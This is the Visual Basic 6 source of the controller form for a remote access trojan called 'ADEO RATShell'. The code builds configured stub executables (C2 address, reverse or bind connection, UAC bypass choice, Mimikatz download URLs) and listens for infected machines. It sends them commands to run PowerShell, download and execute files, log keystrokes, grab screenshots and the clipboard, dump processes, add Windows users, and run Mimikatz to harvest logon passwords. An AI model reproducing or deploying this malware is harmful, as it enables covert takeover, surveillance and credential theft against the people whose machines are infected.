VERSION 5.00
Object = "{831FDD16-0C5C-11D2-A9FC-0000F8754DA1}#2.0#0"; "MSCOMCTL.OCX"
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "MSWINSCK.OCX"
Object = "{3B7C8863-D78F-101B-B9B5-04021C009402}#1.2#0"; "RICHTX32.OCX"
Object = "{9664F006-7A8C-474C-AF49-1D761EBE5855}#1.0#0"; "prjXTab.ocx"
Begin VB.Form Client 
   BackColor       =   &H00FFFFFF&
   BorderStyle     =   3  'Fixed Dialog
   Caption         =   "ADEO RATShell v1.0 ~ Public Edition"
   ClientHeight    =   6690
   ClientLeft      =   150
   ClientTop       =   495
   ClientWidth     =   12600
   Icon            =   "Form2.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   6690
   ScaleWidth      =   12600
   StartUpPosition =   3  'Windows Default
   Begin RichTextLib.RichTextBox RichTextBox1 
      Height          =   1695
      Left            =   120
      TabIndex        =   25
      Top             =   6720
      Width           =   10455
      _ExtentX        =   18441
      _ExtentY        =   2990
      _Version        =   393217
      ScrollBars      =   2
      TextRTF         =   $"Form2.frx":038A
   End
   Begin prjXTab.XTab XTab1 
      Height          =   6495
      Left            =   120
      TabIndex        =   0
      Top             =   120
      Width           =   12375
      _ExtentX        =   21828
      _ExtentY        =   11456
      TabCaption(0)   =   "  Connections  "
      TabContCtrlCnt(0)=   3
      Tab(0)ContCtrlCap(1)=   "Text1"
      Tab(0)ContCtrlCap(2)=   "ListView1"
      Tab(0)ContCtrlCap(3)=   "Image1"
      TabCaption(1)   =   "  Create Server  "
      TabContCtrlCnt(1)=   15
      Tab(1)ContCtrlCap(1)=   "Command1"
      Tab(1)ContCtrlCap(2)=   "XP_ProgressBar1"
      Tab(1)ContCtrlCap(3)=   "wxpText5"
      Tab(1)ContCtrlCap(4)=   "wxpText4"
      Tab(1)ContCtrlCap(5)=   "wxpText3"
      Tab(1)ContCtrlCap(6)=   "xFrame4"
      Tab(1)ContCtrlCap(7)=   "xFrame3"
      Tab(1)ContCtrlCap(8)=   "xFrame2"
      Tab(1)ContCtrlCap(9)=   "wxpText2"
      Tab(1)ContCtrlCap(10)=   "wxpText1"
      Tab(1)ContCtrlCap(11)=   "Label5"
      Tab(1)ContCtrlCap(12)=   "Label4"
      Tab(1)ContCtrlCap(13)=   "Label3"
      Tab(1)ContCtrlCap(14)=   "Label2"
      Tab(1)ContCtrlCap(15)=   "Label1"
      TabCaption(2)   =   "  About  "
      TabContCtrlCnt(2)=   1
      Tab(2)ContCtrlCap(1)=   "Picture1"
      ActiveTab       =   1
      TabStyle        =   1
      TabTheme        =   1
      ActiveTabBackStartColor=   16777215
      ActiveTabBackEndColor=   16777215
      InActiveTabBackStartColor=   16777215
      InActiveTabBackEndColor=   15397104
      ActiveTabForeColor=   255
      BeginProperty ActiveTabFont {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   162
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      BeginProperty InActiveTabFont {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   162
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      OuterBorderColor=   10198161
      DisabledTabBackColor=   16777215
      DisabledTabForeColor=   10526880
      Begin VB.PictureBox Picture1 
         Appearance      =   0  'Flat
         BackColor       =   &H80000005&
         ForeColor       =   &H80000008&
         Height          =   5895
         Left            =   -74880
         Picture         =   "Form2.frx":040E
         ScaleHeight     =   5865
         ScaleWidth      =   12105
         TabIndex        =   24
         Top             =   480
         Width           =   12135
      End
      Begin ADEO.CommandXP Command1 
         Height          =   375
         Left            =   9360
         TabIndex        =   23
         Top             =   5640
         Width           =   2895
         _ExtentX        =   5106
         _ExtentY        =   661
         BTYPE           =   3
         TX              =   "Create Server"
         ENAB            =   -1  'True
         BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   162
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         COLTYPE         =   1
         FOCUSR          =   -1  'True
         BCOL            =   15790320
         BCOLO           =   15790320
         FCOL            =   0
         FCOLO           =   0
         MCOL            =   12632256
         MPTR            =   1
         MICON           =   "Form2.frx":1B867
         PICN            =   "Form2.frx":1B883
         UMCOL           =   -1  'True
         SOFT            =   0   'False
         PICPOS          =   0
         NGREY           =   0   'False
         FX              =   0
         HAND            =   0   'False
         CHECK           =   0   'False
         VALUE           =   0   'False
      End
      Begin ADEO.XP_ProgressBar XP_ProgressBar1 
         Height          =   255
         Left            =   120
         TabIndex        =   22
         Top             =   6120
         Width           =   12135
         _ExtentX        =   21405
         _ExtentY        =   450
      End
      Begin ADEO.wxpText wxpText5 
         Height          =   285
         Left            =   1320
         TabIndex        =   21
         Top             =   2250
         Width           =   7935
         _ExtentX        =   13996
         _ExtentY        =   503
         Text            =   "http://domain.com/mimi_x64.txt"
         BackColor       =   -2147483643
         BackColor       =   -2147483643
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
      End
      Begin ADEO.wxpText wxpText4 
         Height          =   285
         Left            =   1320
         TabIndex        =   20
         Top             =   1890
         Width           =   7935
         _ExtentX        =   13996
         _ExtentY        =   503
         Text            =   "http://domain.com/mimi_x86.txt"
         BackColor       =   -2147483643
         BackColor       =   -2147483643
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
      End
      Begin ADEO.wxpText wxpText3 
         Height          =   285
         Left            =   960
         TabIndex        =   17
         Top             =   1510
         Width           =   8295
         _ExtentX        =   14631
         _ExtentY        =   503
         Text            =   "http://domain.com/codes.txt"
         BackColor       =   -2147483643
         BackColor       =   -2147483643
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
      End
      Begin ADEO.xFrame xFrame4 
         Height          =   3375
         Left            =   120
         TabIndex        =   14
         Top             =   2640
         Width           =   9135
         _ExtentX        =   16113
         _ExtentY        =   5953
         BackColor       =   16777215
         Caption         =   "UAC Bypass Method"
         DisplayPicture  =   -1  'True
         Enabled         =   -1  'True
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   162
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         FontBold        =   0   'False
         FontItalic      =   0   'False
         FontSize        =   8,25
         FontStrikethru  =   0   'False
         FontUnderline   =   0   'False
         HeaderGradientBottom=   12611136
         Picture         =   "Form2.frx":1BE1D
         Begin VB.ListBox List1 
            Appearance      =   0  'Flat
            Height          =   2955
            ItemData        =   "Form2.frx":1C3B7
            Left            =   120
            List            =   "Form2.frx":1C3F1
            TabIndex        =   15
            Top             =   360
            Width           =   8895
         End
      End
      Begin ADEO.xFrame xFrame3 
         Height          =   1455
         Left            =   9360
         TabIndex        =   11
         Top             =   2280
         Width           =   2895
         _ExtentX        =   5106
         _ExtentY        =   2566
         BackColor       =   16777215
         Caption         =   "OS Arch"
         DisplayPicture  =   -1  'True
         Enabled         =   -1  'True
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   162
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         FontBold        =   0   'False
         FontItalic      =   0   'False
         FontSize        =   8,25
         FontStrikethru  =   0   'False
         FontUnderline   =   0   'False
         HeaderGradientBottom=   12611136
         Picture         =   "Form2.frx":1CC34
         Begin VB.OptionButton Option1 
            BackColor       =   &H00FFFFFF&
            Caption         =   "x86 Exe/PowerShell"
            Height          =   255
            Left            =   120
            TabIndex        =   13
            Top             =   480
            Value           =   -1  'True
            Width           =   2655
         End
         Begin VB.OptionButton Option2 
            BackColor       =   &H00FFFFFF&
            Caption         =   "x64 Exe/PowerShell"
            Height          =   255
            Left            =   120
            TabIndex        =   12
            Top             =   840
            Width           =   2415
         End
      End
      Begin ADEO.xFrame xFrame2 
         Height          =   1695
         Left            =   9360
         TabIndex        =   8
         Top             =   480
         Width           =   2895
         _ExtentX        =   5106
         _ExtentY        =   2990
         BackColor       =   16777215
         Caption         =   "Connection Type"
         DisplayPicture  =   -1  'True
         Enabled         =   -1  'True
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   162
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         FontBold        =   0   'False
         FontItalic      =   0   'False
         FontSize        =   8,25
         FontStrikethru  =   0   'False
         FontUnderline   =   0   'False
         HeaderGradientBottom=   12611136
         Picture         =   "Form2.frx":1D1CE
         Begin VB.OptionButton Option4 
            BackColor       =   &H00FFFFFF&
            Caption         =   "Bind Connection"
            Height          =   255
            Left            =   120
            TabIndex        =   10
            Top             =   840
            Width           =   2295
         End
         Begin VB.OptionButton Option3 
            BackColor       =   &H00FFFFFF&
            Caption         =   "Reverse Connection"
            Height          =   255
            Left            =   120
            TabIndex        =   9
            Top             =   480
            Value           =   -1  'True
            Width           =   2415
         End
      End
      Begin ADEO.wxpText wxpText2 
         Height          =   285
         Left            =   960
         TabIndex        =   7
         Top             =   1080
         Width           =   975
         _ExtentX        =   1720
         _ExtentY        =   503
         Text            =   "1"
         BackColor       =   -2147483643
         BackColor       =   -2147483643
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
      End
      Begin ADEO.wxpText wxpText1 
         Height          =   285
         Left            =   960
         TabIndex        =   5
         Top             =   690
         Width           =   2775
         _ExtentX        =   4895
         _ExtentY        =   503
         Text            =   "10.5.70.178"
         BackColor       =   -2147483643
         BackColor       =   -2147483643
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
      End
      Begin RichTextLib.RichTextBox Text1 
         Height          =   1935
         Left            =   -74880
         TabIndex        =   3
         Top             =   4440
         Width           =   8535
         _ExtentX        =   15055
         _ExtentY        =   3413
         _Version        =   393217
         ScrollBars      =   2
         Appearance      =   0
         TextRTF         =   $"Form2.frx":1D768
      End
      Begin ADEO.xFrame xFrame1 
         Height          =   2415
         Left            =   -74880
         TabIndex        =   2
         Top             =   480
         Width           =   4215
         _ExtentX        =   7435
         _ExtentY        =   4260
         Caption         =   "Settings"
         Enabled         =   -1  'True
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   162
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         FontBold        =   0   'False
         FontItalic      =   0   'False
         FontSize        =   8,25
         FontStrikethru  =   0   'False
         FontUnderline   =   0   'False
         HeaderGradientBottom=   12611136
      End
      Begin MSComctlLib.ListView ListView1 
         Height          =   3975
         Left            =   -74880
         TabIndex        =   1
         Top             =   360
         Width           =   12135
         _ExtentX        =   21405
         _ExtentY        =   7011
         View            =   3
         LabelEdit       =   1
         LabelWrap       =   -1  'True
         HideSelection   =   -1  'True
         FullRowSelect   =   -1  'True
         GridLines       =   -1  'True
         _Version        =   393217
         ForeColor       =   -2147483640
         BackColor       =   -2147483643
         BorderStyle     =   1
         Appearance      =   0
         NumItems        =   0
      End
      Begin VB.Label Label5 
         BackStyle       =   0  'Transparent
         Caption         =   "Mimikatz x64:"
         Height          =   255
         Left            =   240
         TabIndex        =   19
         Top             =   2280
         Width           =   1095
      End
      Begin VB.Label Label4 
         BackStyle       =   0  'Transparent
         Caption         =   "Mimikatz x86:"
         Height          =   255
         Left            =   240
         TabIndex        =   18
         Top             =   1920
         Width           =   1335
      End
      Begin VB.Label Label3 
         BackStyle       =   0  'Transparent
         Caption         =   "LibFile:"
         Height          =   255
         Left            =   240
         TabIndex        =   16
         Top             =   1560
         Width           =   1095
      End
      Begin VB.Label Label2 
         BackStyle       =   0  'Transparent
         Caption         =   "Port:"
         Height          =   255
         Left            =   240
         TabIndex        =   6
         Top             =   1110
         Width           =   615
      End
      Begin VB.Label Label1 
         BackStyle       =   0  'Transparent
         Caption         =   "IP/Host:"
         Height          =   255
         Left            =   240
         TabIndex        =   4
         Top             =   720
         Width           =   1455
      End
      Begin VB.Image Image1 
         Appearance      =   0  'Flat
         BorderStyle     =   1  'Fixed Single
         Height          =   1935
         Left            =   -66240
         Stretch         =   -1  'True
         Top             =   4440
         Width           =   3495
      End
   End
   Begin VB.Timer Timer1 
      Enabled         =   0   'False
      Interval        =   1000
      Left            =   11160
      Top             =   6720
   End
   Begin MSWinsockLib.Winsock Winsock1 
      Left            =   12120
      Top             =   6720
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin MSWinsockLib.Winsock Winsock 
      Index           =   0
      Left            =   11640
      Top             =   6720
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin VB.Menu mnufile 
      Caption         =   "mnufile"
      Visible         =   0   'False
      Begin VB.Menu getscreen 
         Caption         =   "Get Screenshot"
      End
      Begin VB.Menu runcommand 
         Caption         =   "Run command"
      End
      Begin VB.Menu downloadrun 
         Caption         =   "Download & Execute file"
      End
      Begin VB.Menu dumpprocess 
         Caption         =   "Dump Process"
      End
      Begin VB.Menu getclip 
         Caption         =   "Get ClipBoard"
      End
      Begin VB.Menu startkeylog 
         Caption         =   "Start Keylogger"
      End
      Begin VB.Menu getlogs 
         Caption         =   "Get Key Logs"
      End
      Begin VB.Menu adduser 
         Caption         =   "Add User to windows"
      End
      Begin VB.Menu mimikatz 
         Caption         =   "Run Mimikatz"
      End
   End
End
Attribute VB_Name = "Client"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Dim LVConnections As Integer
Private Const SPLITTER As String = "{Split}"
Dim X As Integer
Dim ConnectionID As Integer
Dim ListenPort As String
Dim Sniff As Boolean
Private Declare Function GetSysColor Lib "user32" (ByVal nIndex As Long) As Long

Private Sub Command1_Click()
On Error Resume Next
XP_ProgressBar1.Max = 100
XP_ProgressBar1.Value = 20
Dim Stub() As Byte
Dim ConnectionType As String
Dim UACBypassTeknik As String
Dim YazilacakString As String

Kill App.Path & "\Connector.exe"
Kill App.Path & "\Stub.exe"

If Option1.Value = True Then
Stub() = LoadResData(101, "CUSTOM")
ElseIf Option2.Value = True Then
Stub() = LoadResData(102, "CUSTOM")
End If
XP_ProgressBar1.Value = 40

If Option3.Value = True Then
ConnectionType = "Reverse"
ElseIf Option4.Value = True Then
ConnectionType = "Bind"
End If
XP_ProgressBar1.Value = 60

If List1.SelCount < 1 Then
MsgBox "Please select any uac bypass method from list!", vbCritical, "Stop!"
XP_ProgressBar1.Value = 0
Exit Sub
End If

UACBypassTeknik = List1.ListIndex + 1
YazilacakString = "<SplitCode>" & wxpText1.Text & "<SplitCode>" & wxpText2.Text & "<SplitCode>" & wxpText3.Text & "<SplitCode>" & wxpText4.Text & "<SplitCode>" & wxpText5.Text & "<SplitCode>" & ConnectionType & "<SplitCode>" & UACBypassTeknik

XP_ProgressBar1.Value = 70

Open App.Path & "\Stub.exe" For Binary As #1
Put #1, , Stub()
Close #1

XP_ProgressBar1.Value = 80

Open App.Path & "\Connector.exe" For Binary As #1
Put #1, , STRING_TO_BYTES(LoadFile(App.Path & "\Stub.exe") & YazilacakString)
Close #1

XP_ProgressBar1.Value = 90

Kill App.Path & "\Stub.exe"

XP_ProgressBar1.Value = 100

MsgBox "Done!", vbInformation
End Sub

Private Sub Form_Initialize()
ListenPort = InputBox("Listening port;")
wxpText2.Text = ListenPort
End Sub

Private Sub Form_Load()

ConnectionID = 0
ListView1.ColumnHeaders.Add , , "ID"
ListView1.ColumnHeaders.Add , , "Username/ComputerName", 3000
ListView1.ColumnHeaders.Add , , "IP"
ListView1.ColumnHeaders.Add , , "UAC"
ListView1.ColumnHeaders.Add , , "Opened With Admin", 2200
ListView1.ColumnHeaders.Add , , "AntiVirus", 2500
ListView1.ColumnHeaders.Add , , "Index", 0


Winsock1.Close
Winsock1.LocalPort = CInt(ListenPort)
Winsock1.Listen
End Sub
Private Function LVIndex() As Integer
LVIndex = CInt(ListView1.SelectedItem.SubItems(6))
End Function
Function DecodeBase64(ByVal strData As String) As Byte()
On Error Resume Next
 

    Dim objXML As MSXML2.DOMDocument
    Dim objNode As MSXML2.IXMLDOMElement
    
    ' help from MSXML
    Set objXML = New MSXML2.DOMDocument
    Set objNode = objXML.createElement("b64")
    objNode.dataType = "bin.base64"
    objNode.Text = strData
    DecodeBase64 = objNode.nodeTypedValue
    
    ' thanks, bye
    Set objNode = Nothing
    Set objXML = Nothing
End Function
Private Sub Image1_Click()
Shell "Explorer.exe " & App.Path & "\ReceivedScreens\screen.png", vbMaximizedFocus
End Sub

Private Sub ListView1_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
If ListView1.ListItems.Count = 0 Then Exit Sub
If Button = 2 Then Me.PopupMenu mnufile
End Sub

Private Sub runcommand_Click()
On Error Resume Next
Text1.Text = ""
Dim SMessage As String
SMessage = InputBox("PowerShell Command;")
If SMessage = "" Then Exit Sub
Winsock(LVIndex).SendData SMessage
End Sub
Private Sub adduser_Click()
On Error Resume Next
Text1.Text = ""
Dim UserName As String
Dim Password As String
UserName = InputBox("Username;")
Password = InputBox("Password;")
If UserName = "" Then Exit Sub
Winsock(LVIndex).SendData "<adduser>" & UserName & "<adduser>" & Password & "<adduser>"
End Sub
Private Sub getlogs_Click()
On Error Resume Next
Text1.Text = ""
Winsock(LVIndex).SendData "getlogs"
End Sub
Private Sub startkeylog_Click()
On Error Resume Next
Text1.Text = ""
Winsock(LVIndex).SendData "StartKeylog"
End Sub
Private Sub getclip_Click()
On Error Resume Next
Text1.Text = ""
Winsock(LVIndex).SendData "Get-clip"
End Sub
Private Sub getscreen_Click()
On Error Resume Next
Kill Environ("TEMP") & "\sc.tmp"
Kill App.Path & "\ReceivedScreens\screen.png"
Pause 0.3
Text1.Text = "Screenshot command sending.."
RichTextBox1.Text = ""
Winsock(LVIndex).SendData "Get-Screenshot"
End Sub
Sub Pause(interval)
Current = Timer
Do While Timer - Current < val(interval)
DoEvents
Loop
End Sub
Private Sub dumpprocess_Click()
On Error Resume Next
Text1.Text = ""
Dim DMPProcessName As String
DMPProcessName = InputBox("Put process name for dump")
If DMPProcessName = "" Then Exit Sub
DMPProcessName = Replace(DMPProcessName, ".exe", "")
Winsock(LVIndex).SendData "<processdump>" & DMPProcessName & "<processdump>"
MsgBox "Command send succesfully!" & vbCrLf & vbCrLf & "Dump file will be save as %TEMP% on target machine."
End Sub
Private Sub downloadrun_Click()
On Error Resume Next
Text1.Text = ""
Dim DownLink, DownPath As String
DownLink = InputBox("Download File Link;", , "http://domain.com/x.exe")
DownPath = InputBox("Save file name on TEMP;", , "xxxx.exe")
If DownLink = "" Then Exit Sub
If DownPath = "" Then Exit Sub
Winsock(LVIndex).SendData "<DownloadRun>" & DownLink & "<DownloadRun>" & DownPath & "<DownloadRun>"
End Sub
Private Sub mimikatz_Click()
On Error Resume Next
Text1.Text = "Mimikatz starting on target system..Please wait.." & vbCrLf
Winsock(LVIndex).SendData "Invoke-Mimikatz -Command " & Chr(34) & "privilege::debug sekurlsa::logonpasswords exit" & Chr(34)
End Sub

Private Sub Winsock_Close(Index As Integer)
Dim X As Integer
For X = 1 To ListView1.ListItems.Count
If ListView1.ListItems.Item(X).SubItems(5) = Index Then
ListView1.ListItems.Remove (ListView1.ListItems.Item(X).Index)
Me.Caption = "Client Coded by Surda total connections " & ListView1.ListItems.Count
Exit Sub
End If
Next X
End Sub
Function GetSplitedCode(AllCodes As String, Split1 As String, Split2 As String) As String
arrs = Split(AllCodes, Split1)
arrB = Split(arrs(1), Split2)
TagYakala = arrB(0)
End Function
Private Function LoadFile(sPath As String) As String
    Dim lFileSize As Long
    Dim sData As String
    Dim FF As Integer
    FF = FreeFile
    On Error Resume Next
    Open sPath For Binary Access Read As #FF
    lFileSize = LOF(FF)
    sData = Input$(lFileSize, FF)
    Close #FF
    LoadFile = sData
End Function
Public Function STRING_TO_BYTES(sString As String) As Byte()
  STRING_TO_BYTES = StrConv(sString, vbFromUnicode)
End Function
Private Sub Winsock_DataArrival(Index As Integer, ByVal bytesTotal As Long)
Dim DataA As String
Dim DataB() As String
Dim ImageResponse() As String
Dim GelenImageVerileri As String
Dim PureImage As String
Dim TempFileCode As String
Dim ReceivedImageCodes As String

Winsock(Index).GetData DataA

Text1.Text = Text1.Text & DataA

If InStr(DataA, "<IMAGESPLITCODE>") Then
Sniff = True
End If

If Sniff = True Then
RichTextBox1.Text = RichTextBox1.Text & DataA
End If

If InStr(RichTextBox1.Text, "</IMAGESPLITCODE>") Then
    RichTextBox1.Text = Replace(RichTextBox1.Text, "<IMAGESPLITCODE>", "")
    RichTextBox1.Text = Replace(RichTextBox1.Text, "</IMAGESPLITCODE>", "")
    Open App.Path & "\ReceivedScreens\screen.png" For Binary As #1
    Put #1, , STRING_TO_BYTES(sBase64Decode(RichTextBox1.Text))
    Close #1
    
    Dim picToken As Long
    picToken = iconmodule.InitGDIPlus
    Image1.Picture = iconmodule.LoadPictureGDIPlus(App.Path & "\ReceivedScreens\screen.png", Image1.Width, Image1.Width, vbWhite, False)
    iconmodule.FreeGDIPlus picToken
    Text1.Text = "Done!"
    Sniff = False
End If

DataB = Split(DataA, SPLITTER)
Select Case DataB(0)
Case "LogIn"
    ConnectionID = ConnectionID + 1
    Set AddServerToLstv = ListView1.ListItems.Add(, , ConnectionID)
    With AddServerToLstv
     .SubItems(1) = DataB(1) & "/" & DataB(2)
     .SubItems(2) = Winsock1.RemoteHostIP
     .SubItems(3) = DataB(3)
     .SubItems(4) = DataB(4)
     .SubItems(5) = DataB(5)
     .SubItems(6) = Index
    End With
    Text1.Text = ""
    Me.Caption = "Connections: " & ListView1.ListItems.Count
End Select

End Sub
Private Sub Winsock_Error(Index As Integer, ByVal Number As Integer, Description As String, ByVal Scode As Long, ByVal Source As String, ByVal HelpFile As String, ByVal HelpContext As Long, CancelDisplay As Boolean)
Dim X As Integer
For X = 1 To ListView1.ListItems.Count
If ListView1.ListItems.Item(X).SubItems(6) = Index Then
ListView1.ListItems.Remove (ListView1.ListItems.Item(X).Index)
Me.Caption = "Connections: " & ListView1.ListItems.Count
Text1.Text = Index & " : " & Description
Exit Sub
End If
Next X
End Sub
Private Sub Winsock1_Close()
Winsock1.Close
Winsock1.Listen
End Sub
Private Sub Winsock1_ConnectionRequest(ByVal requestID As Long)
LVConnections = LVConnections + 1
Load Winsock(LVConnections)
Winsock(LVConnections).Accept requestID
End Sub
Private Sub Winsock1_Error(ByVal Number As Integer, Description As String, ByVal Scode As Long, ByVal Source As String, ByVal HelpFile As String, ByVal HelpContext As Long, CancelDisplay As Boolean)
Winsock1.Close
Winsock1.Listen
Client.Caption = "Error!"
End Sub

